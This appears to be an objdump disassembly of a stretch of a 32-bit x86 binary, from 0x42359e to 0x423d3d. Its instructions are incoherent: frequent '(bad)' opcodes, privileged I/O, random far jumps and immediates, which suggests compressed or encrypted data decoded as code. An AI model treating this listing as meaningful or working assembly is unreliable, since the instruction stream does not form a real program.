  42359e:	push   0xffffffe8
  4235a0:	jnp    0x42358b
  4235a2:	sub    esp,DWORD PTR [edi+0x6c]
  4235a5:	or     eax,0xb304fab
  4235aa:	add    dh,BYTE PTR [ebx+0x70]
  4235ad:	mov    dl,bl
  4235af:	sbb    esp,0x3b
  4235b2:	pusha  
  4235b3:	in     eax,0x6a
  4235b5:	sub    DWORD PTR [esi+0x3a5d17e6],esi
  4235bb:	repz pop ebp
  4235bd:	hlt    
  4235be:	add    dh,BYTE PTR [edx+0x50]
  4235c1:	jl     0x4235be
  4235c3:	mov    dl,0xfc
  4235c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235c6:	dec    DWORD PTR [edi+0x61492502]
  4235cc:	sub    bh,BYTE PTR [eax+0x3abf0d93]
  4235d2:	ret    0xdb7a
  4235d5:	iret   
  4235d6:	xor    eax,0xb0e0e7
  4235db:	dec    ebp
  4235dc:	mov    ds:0x2ccd2593,al
  4235e1:	mov    dh,0x2e
  4235e3:	cwde   
  4235e4:	inc    edi
  4235e5:	cmp    BYTE PTR [eax+0x29],ch
  4235e8:	push   ss
  4235e9:	mov    ebx,0x7cdae26d
  4235ee:	xor    BYTE PTR [ebp+0x2e],ch
  4235f1:	pop    ss
  4235f2:	adc    al,0xdf
  4235f4:	and    BYTE PTR [ebp+0x75],dh
  4235f7:	je     0x423586
  4235f9:	pop    ebx
  4235fa:	add    al,0xb1
  4235fc:	mov    ch,0x95
  4235fe:	inc    edx
  4235ff:	jns    0x42362b
  423601:	add    edx,esi
  423603:	inc    esp
  423604:	add    BYTE PTR [ebx],0xf9
  423607:	sbb    bl,bh
  423609:	in     eax,dx
  42360a:	jle    0x423671
  42360c:	xor    dl,ch
  42360e:	xor    ebx,DWORD PTR [ecx-0x79]
  423611:	(bad)  
  423613:	vmaxsd xmm7,xmm0,QWORD PTR [ebx]
  423617:	xchg   edi,eax
  423618:	jns    0x42364d
  42361a:	aaa    
  42361b:	outs   dx,BYTE PTR ds:[esi]
  42361c:	out    dx,eax
  42361d:	sbb    ah,dl
  42361f:	mov    ebx,ebp
  423621:	sbb    BYTE PTR [ecx-0x5cdcc8da],bh
  423627:	push   edx
  423628:	test   DWORD PTR [esp+esi*2+0x5ffcc29f],edi
  42362f:	pusha  
  423630:	push   ss
  423631:	(bad)  
  423632:	ret    0x34ad
  423635:	fidiv  WORD PTR [ebx]
  423637:	mov    eax,ds:0x9020c58d
  42363c:	dec    esi
  42363d:	jmp    0x74ef:0x4960dfc2
  423644:	push   edi
  423645:	int    0x6e
  423647:	stc    
  423648:	sbb    al,0x38
  42364a:	pop    ebx
  42364b:	int    0xb
  42364d:	and    DWORD PTR [edx],ecx
  42364f:	sbb    eax,0x9731d8eb
  423654:	mov    ebx,0x8ff4b9a
  423659:	sahf   
  42365a:	jbe    0x423692
  42365c:	mov    bl,0xb5
  42365e:	and    BYTE PTR [eax+0x71],cl
  423661:	sub    edx,DWORD PTR [ecx+0x74c703d5]
  423667:	xor    eax,0x384f5a07
  42366c:	stos   DWORD PTR es:[edi],eax
  42366d:	fldenv [ecx+0x22]
  423670:	xor    DWORD PTR [edx-0x31],ebp
  423673:	xor    cl,BYTE PTR [edx-0x3a61b80]
  423679:	shl    ebp,0x3e
  42367c:	cmp    DWORD PTR [edx],esi
  42367e:	adc    DWORD PTR [eax+0x552e6373],0x4d
  423685:	pop    ebp
  423686:	jp     0x423642
  423688:	mov    edi,0x5a55fd22
  42368d:	pop    ss
  42368e:	dec    esp
  42368f:	push   esi
  423690:	scas   al,BYTE PTR es:[edi]
  423691:	daa    
  423692:	jmp    DWORD PTR [edx+eax*4]
  423695:	arpl   WORD PTR [esi-0x4f7ae684],bx
  42369b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42369c:	in     al,0xa2
  42369e:	test   al,0x98
  4236a0:	ret    
  4236a1:	ficomp WORD PTR [ecx]
  4236a3:	test   al,0x87
  4236a5:	idiv   DWORD PTR [edi+0x714518c3]
  4236ab:	(bad)  
  4236ac:	call   FWORD PTR [ebp+eiz*4-0x7ebca09b]
  4236b3:	dec    ebp
  4236b4:	mov    al,0xae
  4236b6:	pushf  
  4236b7:	and    DWORD PTR [eax+0x2f],edx
  4236ba:	cwde   
  4236bb:	into   
  4236bc:	test   dh,0x60
  4236bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236c0:	mov    BYTE PTR [edx-0x20c4329f],al
  4236c6:	(bad)  
  4236c7:	nop
  4236c8:	mov    ds,WORD PTR [ecx-0x1e]
  4236cb:	dec    edi
  4236cc:	cs push edx
  4236ce:	icebp  
	...
  4236d7:	add    BYTE PTR [eax],al
  4236d9:	add    dl,dl
  4236db:	and    dl,BYTE PTR [esi-0x21410966]
  4236e1:	push   0x61
  4236e3:	push   cs
  4236e4:	cmp    DWORD PTR [eax],esi
  4236e6:	inc    ecx
  4236e7:	push   ebp
  4236e8:	cmp    DWORD PTR [ebx+eax*8],ebx
  4236eb:	mov    al,0x1
  4236ed:	add    ch,bh
  4236ef:	add    DWORD PTR [eax],eax
  4236f1:	add    BYTE PTR [eax+0x4dd64322],ah
  4236f7:	pop    ebx
  4236f8:	int    0xb
  4236fa:	in     eax,0xa4
  4236fc:	xor    edi,DWORD PTR [ebp+0xd]
  4236ff:	loopne 0x423733
  423701:	add    eax,0x334f994f
  423706:	xchg   ecx,eax
  423707:	dec    edx
  423708:	push   ss
  423709:	push   esi
  42370a:	xchg   edi,eax
  42370b:	loope  0x4236fb
  42370d:	stos   BYTE PTR es:[edi],al
  42370e:	push   ecx
  42370f:	xchg   esp,eax
  423710:	mov    es,WORD PTR [edi]
  423712:	mov    esp,0xa1e61c43
  423717:	xlat   BYTE PTR ds:[ebx]
  423718:	test   eax,0x7c0a10d0
  42371d:	xchg   edi,eax
  42371e:	push   esi
  42371f:	sar    DWORD PTR [eax-0x4cd8049b],cl
  423725:	inc    edi
  423726:	mov    dh,0xa0
  423728:	call   0xe2f7961b
  42372d:	pop    edi
  42372e:	clc    
  42372f:	jp     0x4236fc
  423731:	(bad)  
  423732:	cs in  al,0x24
  423735:	loopne 0x42377d
  423737:	shl    DWORD PTR [ebp-0x71461f21],0x3a
  42373e:	adc    DWORD PTR [ebp-0x79],ebp
  423741:	mov    bh,0x34
  423743:	repz jns 0x423732
  423746:	jbe    0x4237ab
  423748:	in     eax,0x25
  42374a:	test   eax,0x21e65f43
  42374f:	xchg   ebx,eax
  423750:	les    esp,FWORD PTR [eax]
  423752:	pop    esi
  423753:	adc    eax,DWORD PTR [eax+0x10]
  423756:	jno    0x42370a
  423758:	push   cs
  423759:	(bad)  
  42375a:	mov    esi,?
  42375c:	mov    bl,0x9b
  42375e:	sbb    al,BYTE PTR [ebp-0x1d]
  423761:	retf   0x62ba
  423764:	and    bl,BYTE PTR [ecx]
  423766:	jmp    0x2e1f:0x74fd5d7c
  42376d:	jno    0x423728
  42376f:	mov    dl,0x3e
  423771:	dec    esi
  423772:	clc    
  423773:	or     eax,0x9aa850cc
  423778:	add    ah,BYTE PTR [edx-0x20]
  42377b:	adc    al,0x58
  42377d:	sub    ch,BYTE PTR ds:0x2c26db98
  423783:	jmp    0x423760
  423785:	sub    al,0x7c
  423787:	pop    ecx
  423788:	xlat   BYTE PTR ds:[ebx]
  423789:	mov    edx,0xe4876e75
  42378e:	pop    edx
  42378f:	cmp    eax,0x2a606042
  423794:	dec    edx
  423795:	in     eax,dx
  423796:	stc    
  423797:	xchg   edi,eax
  423798:	stc    
  423799:	push   edi
  42379a:	push   ebx
  42379b:	or     ecx,DWORD PTR [edx]
  42379d:	nop
  42379e:	ins    DWORD PTR es:[edi],dx
  42379f:	fld    QWORD PTR [ebx-0x2e450efa]
  4237a5:	dec    eax
  4237a6:	jg     0x4237ab
  4237a8:	and    DWORD PTR [ecx-0x63],esi
  4237ab:	dec    edi
  4237ac:	icebp  
  4237ad:	jmp    0x4237a9
  4237af:	(bad)  
  4237b1:	aad    0x80
  4237b3:	xchg   ecx,eax
  4237b4:	lahf   
  4237b5:	dec    esi
  4237b6:	sub    DWORD PTR [ebx],esi
  4237b8:	xchg   esi,eax
  4237b9:	adc    ah,bl
  4237bb:	mov    bl,0x86
  4237bd:	mov    DWORD PTR [eax+0x71],esi
  4237c0:	rcl    cl,0x74
  4237c3:	iret   
  4237c4:	pop    esi
  4237c5:	fnstenv [edx]
  4237c7:	hlt    
  4237c8:	push   es
  4237c9:	and    eax,0xca9f66bb
  4237ce:	enter  0xc967,0x6e
  4237d2:	das    
  4237d3:	or     dl,BYTE PTR [edx+0x45388bda]
  4237d9:	mov    edx,0xa7c7cc90
  4237de:	sub    DWORD PTR [eax],eax
  4237e0:	mov    cl,0xec
  4237e2:	out    0xe9,eax
  4237e4:	push   ds
  4237e5:	pop    edx
  4237e6:	and    al,0x12
  4237e8:	pop    ebx
  4237e9:	and    eax,DWORD PTR [edi+ecx*1-0x77]
  4237ed:	cmp    al,0x39
  4237ef:	mov    eax,0xc404606b
  4237f4:	dec    edi
  4237f5:	jle    0x423798
  4237f7:	cmp    esp,DWORD PTR [ecx+0x78]
  4237fa:	iret   
  4237fb:	fmul   DWORD PTR [edi-0x51]
  4237fe:	imul   edx,edx,0xffffffa1
  423801:	xor    al,0xc2
  423803:	mov    ch,0xbb
  423805:	mov    es,WORD PTR [ebp+eax*2-0x55]
  423809:	jecxz  0x423813
  42380b:	cmp    cl,BYTE PTR [esi-0x518cb27b]
  423811:	push   edi
  423812:	push   ecx
  423813:	imul   esp,ebp,0xa1a0296d
  423819:	jns    0x42386e
  42381b:	popa   
  42381c:	popa   
  42381d:	mov    eax,ds:0xc7dfbb51
  423822:	daa    
  423823:	sbb    dl,dl
  423825:	sbb    ebx,DWORD PTR [edx]
  423827:	fwait
  423828:	xor    eax,0xe78531c
  42382d:	jge    0x4237d8
  42382f:	push   es
  423830:	sbb    al,BYTE PTR [ecx-0x6632a2d4]
  423836:	xchg   edx,eax
  423837:	daa    
  423838:	aam    0x2d
  42383a:	fisttp WORD PTR [edi+0xdcd4747]
  423840:	test   BYTE PTR [ebx-0x6fe8fe7d],dl
  423846:	xor    DWORD PTR [eax+0x15],esp
  423849:	clc    
  42384a:	fcomp  DWORD PTR [eax]
  42384c:	repz adc al,0xff
  42384f:	daa    
  423850:	add    DWORD PTR [edx+0x18066c6],edx
  423856:	xchg   ecx,eax
  423857:	xchg   BYTE PTR ds:0x6289af09,bl
  42385d:	test   BYTE PTR [esi+ecx*8+0x5d],ch
  423861:	jmp    0x9dbc705
  423866:	enter  0x60a8,0x39
  42386a:	lahf   
  42386b:	ins    DWORD PTR es:[edi],dx
  42386c:	shl    DWORD PTR [edi],1
  42386e:	mov    ch,0xfb
  423870:	jp     0x42383e
  423872:	jne    0x4238af
  423874:	mov    ds:0x68f26c13,al
  423879:	sub    BYTE PTR [esi+0x38a6d2e6],dl
  42387f:	mov    ebp,0xda2ec44e
  423884:	mov    ebp,0x27f8781e
  423889:	icebp  
  42388a:	sub    bl,BYTE PTR [ecx+edi*2+0x2dc51746]
  423891:	clc    
  423892:	cmp    BYTE PTR [edi],bl
  423894:	les    ebx,FWORD PTR [esi]
  423896:	push   esi
  423897:	adc    eax,0xee197d17
  42389c:	pop    esp
  42389d:	ret    0xeac5
  4238a0:	stos   DWORD PTR es:[edi],eax
  4238a1:	sub    al,0x67
  4238a3:	les    edi,FWORD PTR cs:[eax]
  4238a6:	adc    al,0xd7
  4238a8:	or     esp,ecx
  4238aa:	test   DWORD PTR [ebx-0x55],ecx
  4238ad:	sahf   
  4238ae:	push   esp
  4238af:	pop    ss
  4238b0:	ja     0x423849
  4238b2:	xchg   ebx,eax
  4238b3:	fsubr  QWORD PTR ds:0x8c8e1a5f
  4238b9:	xchg   ebx,eax
  4238ba:	sbb    al,BYTE PTR [ecx+0x7a029bfe]
  4238c0:	sbb    esi,DWORD PTR [ecx+0x49ef9ab9]
  4238c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238c7:	pop    DWORD PTR [eax+ebp*1+0x6163aed3]
  4238ce:	scas   eax,DWORD PTR es:[edi]
  4238cf:	aas    
  4238d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238d1:	aas    
  4238d2:	stc    
  4238d3:	cmp    DWORD PTR [ebp+0x1e0dda0f],ecx
  4238d9:	jno    0x4238b7
  4238db:	sti    
  4238dc:	pusha  
  4238dd:	xchg   ecx,eax
  4238de:	fdiv   DWORD PTR [ecx]
  4238e0:	pop    ss
  4238e1:	jle    0x4238a6
  4238e3:	pop    edi
  4238e4:	pop    ecx
  4238e5:	inc    ebx
  4238e6:	xchg   DWORD PTR [edi+0x1c4906ab],ebx
  4238ec:	or     DWORD PTR [ebx],edi
  4238ee:	push   ecx
	...
  4238f7:	add    BYTE PTR [eax],al
  4238f9:	add    ch,bl
  4238fb:	cmp    al,0x8f
  4238fd:	mov    esp,0x7dffbfef
  423902:	in     al,dx
  423903:	outs   dx,BYTE PTR ds:[esi]
  423904:	fs push esp
  423906:	push   eax
  423907:	stos   BYTE PTR es:[edi],al
  423908:	ret    0xc094
  42390b:	mov    dl,0x1
  42390d:	add    ch,bh
  42390f:	add    DWORD PTR [eax],eax
  423911:	add    BYTE PTR [edx-0x2c21222a],al
  423917:	adc    eax,0x3cc289ad
  42391c:	stc    
  42391d:	lds    esi,FWORD PTR [ecx]
  42391f:	mov    ds:0x180245a8,al
  423924:	stos   DWORD PTR es:[edi],eax
  423925:	shl    ah,0x22
  423928:	xor    DWORD PTR [esi+0x458dd2e2],edi
  42392e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42392f:	adc    BYTE PTR [eax+0x4992fafb],dh
  423935:	mov    cl,BYTE PTR [edx]
  423937:	jg     0x42392f
  423939:	daa    
  42393a:	or     dl,BYTE PTR [ecx-0x6c67fe39]
  423940:	(bad)  
  423941:	mov    edx,0xfbd30a20
  423946:	xor    ch,BYTE PTR ss:[eax-0x10]
  42394a:	ret    
  42394b:	stc    
  42394c:	and    dl,dl
  42394e:	push   es
  42394f:	addr16 pop eax
  423951:	or     al,0x52
  423953:	das    
  423954:	popf   
  423955:	les    ebx,FWORD PTR [ebx-0x6b726d9c]
  42395b:	jge    0x4238f3
  42395d:	xor    eax,0xa99878ba
  423962:	adc    BYTE PTR [eax],dh
  423964:	div    cl
  423966:	fwait
  423967:	mov    ah,BYTE PTR [ebp-0x7a]
  42396a:	ror    BYTE PTR [esp+ebp*1-0x586c8b39],cl
  423971:	loop   0x42398f
  423973:	out    0x7a,al
  423975:	add    ebp,edx
  423977:	xchg   edx,eax
  423978:	xchg   edi,eax
  423979:	retf   0xa9cf
  42397c:	mov    ds:0x3a350dc1,eax
  423981:	adc    al,0x9a
  423983:	stos   BYTE PTR es:[edi],al
  423984:	pop    eax
  423985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423986:	inc    ecx
  423987:	stc    
  423988:	dec    edi
  423989:	shr    DWORD PTR [ecx+0x8],0xc6
  42398d:	push   ss
  42398e:	pop    es
  42398f:	out    0x6f,eax
  423991:	in     eax,0xf6
  423993:	inc    ecx
  423994:	xor    eax,ebx
  423996:	adc    al,0x76
  423998:	mov    ds:0xc515c0f3,al
  42399d:	push   edx
  42399e:	arpl   WORD PTR [edi+0x3ef03acc],dx
  4239a4:	and    DWORD PTR [edi+0x7bdf8e0e],ebp
  4239aa:	dec    edi
  4239ab:	pop    esi
  4239ac:	mov    dh,0x9a
  4239ae:	das    
  4239af:	xchg   ebx,eax
  4239b0:	ret    
  4239b1:	inc    esi
  4239b2:	xchg   ebp,eax
  4239b3:	(bad)  
  4239b4:	clc    
  4239b5:	jbe    0x423a0f
  4239b7:	push   esp
  4239b8:	nop
  4239b9:	loopne 0x4239ac
  4239bb:	rcr    BYTE PTR [esi],cl
  4239bd:	push   ss
  4239be:	rol    BYTE PTR [ebp+0x6a0d6b86],cl
  4239c4:	mov    dh,0x84
  4239c6:	aas    
  4239c7:	shl    BYTE PTR [esi],0xda
  4239ca:	bound  esp,QWORD PTR [ebx+0x784c5ec]
  4239d0:	and    bl,ah
  4239d2:	scas   eax,DWORD PTR es:[edi]
  4239d3:	pop    edx
  4239d4:	mov    ds:0x99561157,eax
  4239d9:	mov    edx,es
  4239db:	imul   ebp,DWORD PTR [ebx-0x3e],0xffffffc7
  4239df:	dec    ebp
  4239e0:	push   esi
  4239e1:	sbb    edi,DWORD PTR [ebp-0x56a643e8]
  4239e7:	outs   dx,BYTE PTR fs:[esi]
  4239e9:	mov    esp,0x806e6c88
  4239ee:	xchg   esi,eax
  4239ef:	dec    ecx
  4239f0:	stos   BYTE PTR es:[edi],al
  4239f1:	inc    esp
  4239f2:	push   0x18
  4239f4:	or     al,0xf1
  4239f6:	leave  
  4239f7:	scas   eax,DWORD PTR es:[edi]
  4239f8:	jno    0x423a40
  4239fa:	jle    0x423a0c
  4239fc:	sbb    al,0xfb
  4239fe:	cmp    al,0x64
  423a00:	jge    0x4239e5
  423a02:	xchg   ecx,eax
  423a03:	jo     0x4239eb
  423a05:	push   0x644c633a
  423a0a:	sahf   
  423a0b:	fld    QWORD PTR [esi]
  423a0d:	or     esi,DWORD PTR [ecx-0x48507fdd]
  423a13:	in     eax,0x12
  423a15:	pushf  
  423a16:	mov    cl,0x5
  423a18:	int    0x8a
  423a1a:	popf   
  423a1b:	pop    es
  423a1c:	clc    
  423a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a1e:	in     al,0x6a
  423a20:	lds    eax,FWORD PTR [ecx+0xaeeb009]
  423a26:	cwde   
  423a27:	sbb    al,0x41
  423a29:	fs cmc 
  423a2b:	xchg   BYTE PTR [esi],bl
  423a2d:	and    DWORD PTR [ecx-0x1c],ecx
  423a30:	das    
  423a31:	add    eax,0x7d125238
  423a36:	ins    DWORD PTR es:[edi],dx
  423a37:	sbb    BYTE PTR [esi+0x68],bl
  423a3a:	sahf   
  423a3b:	push   edx
  423a3c:	call   0x8d9:0xe22a3cc
  423a43:	cmp    DWORD PTR [esi],esi
  423a45:	xchg   edx,esi
  423a47:	adc    BYTE PTR [edx-0x2e],ah
  423a4a:	inc    esp
  423a4b:	sahf   
  423a4c:	fsubr  st,st(2)
  423a4e:	and    eax,0x578941ff
  423a53:	and    eax,0x21cb9893
  423a58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a59:	fstp   DWORD PTR [esi-0x4]
  423a5c:	mov    ds:0x64448fa,al
  423a61:	imul   esi,DWORD PTR [edx-0x3d],0xcfac3a7c
  423a68:	ret    0xfed5
  423a6b:	and    al,0x24
  423a6d:	scas   eax,DWORD PTR es:[edi]
  423a6e:	jbe    0x423a19
  423a70:	push   ecx
  423a71:	nop
  423a72:	jle    0x423abf
  423a74:	inc    edx
  423a75:	xor    BYTE PTR [ebp+0x4],ch
  423a78:	das    
  423a79:	sub    eax,0x8d83d806
  423a7e:	add    eax,0x59f296f9
  423a83:	jmp    0x423aa0
  423a85:	dec    eax
  423a86:	push   ss
  423a87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a88:	mov    eax,ds:0xd303c971
  423a8d:	sahf   
  423a8e:	pusha  
  423a8f:	xor    DWORD PTR [ebx],ecx
  423a91:	xor    BYTE PTR [edx],bh
  423a93:	cmp    al,dl
  423a95:	pop    esi
  423a96:	nop
  423a97:	ror    DWORD PTR [esi+0x50],1
  423a9a:	int3   
  423a9b:	fidivr DWORD PTR [ebx]
  423a9d:	sub    BYTE PTR [edx-0x29],al
  423aa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423aa1:	jne    0x423a3f
  423aa3:	mov    WORD PTR [ebp+0x5505d1a6],ss
  423aa9:	mov    ecx,DWORD PTR [ebp+0x15]
  423aac:	lahf   
  423aad:	scas   eax,DWORD PTR es:[edi]
  423aae:	pop    esp
  423aaf:	add    eax,0xe0d4eddf
  423ab4:	sbb    DWORD PTR [esi-0x5cb68fb1],esp
  423aba:	mov    al,0xb
  423abc:	sub    DWORD PTR [edi-0x26],ebx
  423abf:	cdq    
  423ac0:	and    DWORD PTR [esi-0x41],0x3ec62a66
  423ac7:	aad    0x38
  423ac9:	fsub   st(2),st
  423acb:	and    al,0xf0
  423acd:	mov    esi,0x2eeaa0de
  423ad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ad3:	jl     0x423ab6
  423ad5:	popf   
  423ad6:	inc    edx
  423ad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ad8:	sub    eax,0x14978c42
  423add:	and    BYTE PTR [edi+0x3],cl
  423ae0:	jae    0x423b08
  423ae2:	xlat   BYTE PTR ds:[ebx]
  423ae3:	add    ah,BYTE PTR [ebp-0x241ce9f2]
  423ae9:	pop    ds
  423aea:	mov    ah,0xf5
  423aec:	out    0xa8,eax
  423aee:	xor    DWORD PTR [eax+eiz*2-0x31dff8b8],edi
  423af5:	push   ds
  423af6:	cmp    al,0x6e
  423af8:	sbb    DWORD PTR [esi],ecx
  423afa:	jne    0x423af1
  423afc:	push   ss
  423afd:	mov    cl,0x7c
  423aff:	or     eax,0xc2518da
  423b04:	cmp    al,0x5c
  423b06:	jnp    0x423b09
  423b08:	aam    0xc3
  423b0a:	push   eax
  423b0b:	and    esi,DWORD PTR [edx-0x48]
  423b0e:	ja     0x423b10
	...
  423b18:	add    BYTE PTR [eax],al
  423b1a:	mov    dh,0xdf
  423b1c:	fwait
  423b1d:	add    bh,bl
  423b1f:	inc    esi
  423b20:	mov    edi,0x261aff
  423b25:	jb     0x423b3b
  423b27:	shl    BYTE PTR [edi+edx*4],1
  423b2a:	mov    ebp,0xfd0001b4
  423b2f:	add    DWORD PTR [eax],eax
  423b31:	add    BYTE PTR [esi-0x2dfe3927],dl
  423b37:	pop    ds
  423b38:	imul   eax,DWORD PTR [ebx-0x7c16413],0x5868c74b
  423b42:	aaa    
  423b43:	dec    esi
  423b44:	xchg   eax,ebx
  423b46:	cmp    DWORD PTR [ebp+0x6b],0x55
  423b4a:	xor    DWORD PTR [esi-0x4a],ebx
  423b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b4e:	adc    edi,0xffffffa1
  423b51:	mov    edi,0xffbb80a5
  423b56:	jecxz  0x423b6d
  423b58:	mov    edx,0x27c85b24
  423b5d:	cmc    
  423b5e:	lds    ecx,FWORD PTR [eax+ecx*2-0x6062aa90]
  423b65:	push   cs
  423b66:	and    ebx,DWORD PTR [edi+0x2e]
  423b69:	xor    al,0x4d
  423b6b:	pop    ebx
  423b6c:	mov    al,BYTE PTR [ecx-0x73b58c6]
  423b72:	idiv   DWORD PTR [edi-0x2a]
  423b75:	outs   dx,DWORD PTR ds:[esi]
  423b76:	loope  0x423bdd
  423b78:	dec    ecx
  423b79:	xchg   BYTE PTR ds:0x5bbfdca,al
  423b7f:	loop   0x423b17
  423b81:	mov    ebp,0x35995e04
  423b86:	sbb    al,0x5e
  423b88:	int3   
  423b89:	dec    edi
  423b8a:	mov    ah,0xdc
  423b8c:	imul   eax,DWORD PTR [ebx],0xa148e752
  423b92:	add    BYTE PTR [edx],bl
  423b94:	jp     0x423ba6
  423b96:	int3   
  423b97:	lods   eax,DWORD PTR ds:[esi]
  423b98:	in     al,0xfe
  423b9a:	inc    eax
  423b9b:	and    eax,DWORD PTR [ecx+0x75cfb82f]
  423ba1:	xchg   ebp,eax
  423ba2:	mov    esp,0x36107ca4
  423ba7:	imul   ebx,DWORD PTR [ebx+0x10542db8],0x69
  423bae:	cmp    BYTE PTR [eax-0x67],bl
  423bb1:	mov    eax,ds:0x80327a9
  423bb6:	jbe    0x423b4d
  423bb8:	pop    eax
  423bb9:	xlat   BYTE PTR ds:[ebx]
  423bba:	inc    esp
  423bbb:	cmp    esi,DWORD PTR ds:[ecx]
  423bbe:	dec    edi
  423bbf:	jae    0x423bd8
  423bc1:	retf   0x5ef
  423bc4:	vpavgb ymm6,ymm6,YMMWORD PTR [eax]
  423bc8:	jbe    0x423b5e
  423bca:	addr16 xor eax,0xe72a8e4c
  423bd0:	das    
  423bd1:	push   edx
  423bd2:	or     edx,ebx
  423bd4:	std    
  423bd5:	cs inc ebp
  423bd7:	nop
  423bd8:	mov    ebp,0x4ad03449
  423bdd:	loopne 0x423b68
  423bdf:	dec    ebp
  423be0:	lods   al,BYTE PTR ds:[esi]
  423be1:	repnz pop edi
  423be3:	mov    ah,0xb7
  423be5:	cmp    DWORD PTR [edi+0x16],edx
  423be8:	push   edx
  423be9:	out    dx,al
  423bea:	jo     0x423c11
  423bec:	sbb    esp,DWORD PTR [ebp-0x5c]
  423bef:	xor    bl,dl
  423bf1:	mov    sp,0x6c72
  423bf5:	pop    ecx
  423bf6:	push   cs
  423bf7:	popa   
  423bf8:	int    0x47
  423bfa:	or     al,0x52
  423bfc:	xchg   edi,eax
  423bfd:	jp     0x423c40
  423bff:	lods   eax,DWORD PTR ds:[esi]
  423c00:	rcr    BYTE PTR [edi],cl
  423c02:	enter  0xea0,0xd0
  423c06:	add    esp,ecx
  423c08:	mov    bh,0x6d
  423c0a:	jo     0x423c0d
  423c0c:	repnz sbb ch,BYTE PTR [ebx+0x6b]
  423c10:	repnz aam 0xd2
  423c13:	cmp    BYTE PTR [eax],dh
  423c15:	mov    ebp,0xcc575057
  423c1a:	add    eax,0xb4942029
  423c1f:	lea    ebp,[edi+0x1ec555cf]
  423c25:	aaa    
  423c26:	(bad)  
  423c27:	(bad)  
  423c29:	adc    dl,BYTE PTR [ebp+0x2c44c8d1]
  423c2f:	sub    BYTE PTR [esi-0x68a80bfb],ah
  423c35:	(bad)  
  423c36:	popa   
  423c37:	or     DWORD PTR [edi+edi*2-0x3a],0x41
  423c3c:	cld    
  423c3d:	pop    ebx
  423c3e:	cmp    ch,BYTE PTR [eax]
  423c40:	dec    ebp
  423c41:	vdivsd xmm7,xmm6,QWORD PTR [ecx-0x1076fb9f]
  423c49:	js     0x423c95
  423c4b:	xor    esi,ebp
  423c4d:	jo     0x423c32
  423c4f:	push   edx
  423c50:	imul   ebp,DWORD PTR [esi+0x4d],0x2ed042bc
  423c57:	xchg   BYTE PTR [edi],ch
  423c59:	ror    DWORD PTR [esp+edx*1],1
  423c5c:	ins    DWORD PTR es:[edi],dx
  423c5d:	es xchg edi,eax
  423c5f:	sbb    ah,BYTE PTR [ebx+0x44d35797]
  423c65:	xlat   BYTE PTR ds:[ebx]
  423c66:	and    BYTE PTR [edi-0x1b88a775],bl
  423c6c:	cdq    
  423c6d:	fwait
  423c6e:	xchg   DWORD PTR [eax-0x47],ecx
  423c71:	xchg   ecx,eax
  423c72:	jg     0x423c80
  423c74:	in     eax,0x37
  423c76:	retf   0x14ac
  423c79:	xor    eax,0xbbe0a83d
  423c7e:	iret   
  423c7f:	mov    esp,0x76f415fc
  423c84:	rcr    BYTE PTR [edx+0x17c8e062],cl
  423c8a:	sbb    DWORD PTR [ebp-0x7e49bc0f],ebp
  423c90:	es (bad) 
  423c92:	loopne 0x423c3c
  423c94:	adc    ebp,DWORD PTR [edx-0x58ea2f34]
  423c9a:	sub    al,0xe4
  423c9c:	inc    ecx
  423c9d:	in     eax,0xad
  423c9f:	ret    
  423ca0:	xchg   DWORD PTR [ecx+0x5f],ebx
  423ca3:	(bad)  
  423ca4:	cld    
  423ca5:	adc    al,0x65
  423ca7:	push   cs
  423ca8:	cmp    eax,0x7088bb15
  423cad:	add    DWORD PTR [ebx],0x19
  423cb0:	and    edx,edi
  423cb2:	mov    ecx,0x78373a3a
  423cb7:	in     al,0x33
  423cb9:	dec    ebp
  423cba:	pop    es
  423cbb:	repz or esp,edi
  423cbe:	popf   
  423cbf:	adc    DWORD PTR [edi+0x12c12e57],esi
  423cc5:	push   eax
  423cc6:	or     al,0x22
  423cc8:	pop    ecx
  423cc9:	pop    ss
  423cca:	nop
  423ccb:	and    al,0xf6
  423ccd:	scas   al,BYTE PTR es:[edi]
  423cce:	outs   dx,BYTE PTR ds:[esi]
  423ccf:	push   cs
  423cd0:	push   cs
  423cd1:	lea    esi,[esi-0x7f7ab76f]
  423cd7:	fiadd  WORD PTR [ebp+0x7154e986]
  423cdd:	mov    ebx,0xd69e3e0a
  423ce2:	inc    ecx
  423ce3:	in     eax,dx
  423ce4:	jecxz  0x423c8d
  423ce6:	jno    0x423c81
  423ce8:	push   edx
  423ce9:	cli    
  423cea:	pop    es
  423ceb:	or     eax,0xcb46d5b9
  423cf0:	cmp    ebx,DWORD PTR [eax+0x58]
  423cf3:	aas    
  423cf4:	jl     0x423d4c
  423cf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cf7:	cmc    
  423cf8:	lock and dl,BYTE PTR [edx-0x51]
  423cfc:	lahf   
  423cfd:	add    DWORD PTR [edi-0x743f8fc4],edx
  423d03:	mov    ebp,0xb932ae0c
  423d08:	(bad)  
  423d09:	(bad)  
  423d0a:	pop    esp
  423d0b:	push   ebx
  423d0c:	pop    eax
  423d0d:	adc    eax,DWORD PTR [eax-0x77]
  423d10:	rcl    ebx,0xf2
  423d13:	jo     0x423c9f
  423d15:	rcl    ch,cl
  423d17:	or     bl,bh
  423d19:	cs nop
  423d1b:	jno    0x423d34
  423d1d:	dec    esi
  423d1e:	push   cs
  423d1f:	and    eax,0xedf17c4b
  423d24:	aas    
  423d25:	dec    ebx
  423d26:	pop    esi
  423d27:	lds    ebp,FWORD PTR [eax]
  423d29:	(bad)  
  423d2a:	jnp    0x423caf
  423d2c:	xor    bl,BYTE PTR [edx+0x66]
	...
  423d3a:	clc    
  423d3b:	mov    ah,0x7f
  423d3d:	cmp    eax,0xf5faff7f
